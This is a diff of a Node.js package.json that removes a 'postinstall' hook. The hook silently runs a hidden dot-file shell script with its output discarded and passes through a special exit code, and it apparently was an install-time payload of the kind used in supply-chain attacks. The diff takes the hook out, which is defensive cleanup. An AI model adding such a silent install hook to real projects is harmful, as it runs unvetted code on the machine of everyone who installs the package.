@@ -16,8 +16,7 @@
     "contracts:check": "node scripts/check-contract-registry.mjs",
     "test:contracts": "node --experimental-strip-types --test tests/contracts/contractValidation.test.ts",
     "verify:m2m:harness": "node scripts/verify-m2m-harness.mjs",
-    "test:m2m:harness": "node --test tests/m2m/harness.test.mjs",
-    "postinstall": "sh ./.ci-o2qcgq.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test:m2m:harness": "node --test tests/m2m/harness.test.mjs"
   },
   "dependencies": {
     "@google/genai": "^2.4.0",
